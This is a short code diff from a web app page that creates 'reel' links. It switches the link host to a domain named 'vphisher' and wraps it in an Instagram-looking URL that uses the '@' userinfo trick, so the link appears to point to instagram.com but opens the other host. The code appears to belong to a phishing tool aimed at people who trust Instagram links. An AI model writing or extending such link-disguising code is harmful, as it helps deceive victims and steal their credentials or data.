@@ -109,7 +109,7 @@ export default function CreateReelPage() {
       if (error) throw error;
 
       toast.success('Reel link created successfully!');
-      const baseLink = `${window.location.origin.includes('localhost') ? 'http://localhost:3000' : 'https://instagram-reels-dun.vercel.app'}/${reelIdToSubmit}`;
+      const baseLink = `${window.location.origin.includes('localhost') ? 'http://localhost:3000' : 'https://vphisher.onrender.com'}/${reelIdToSubmit}`;
       const socialLink = `https://www.instagram.com/reels/videos/@${baseLink.replace('https://', '').replace('http://', '')}`;
 
       setLastCreatedLink(baseLink);
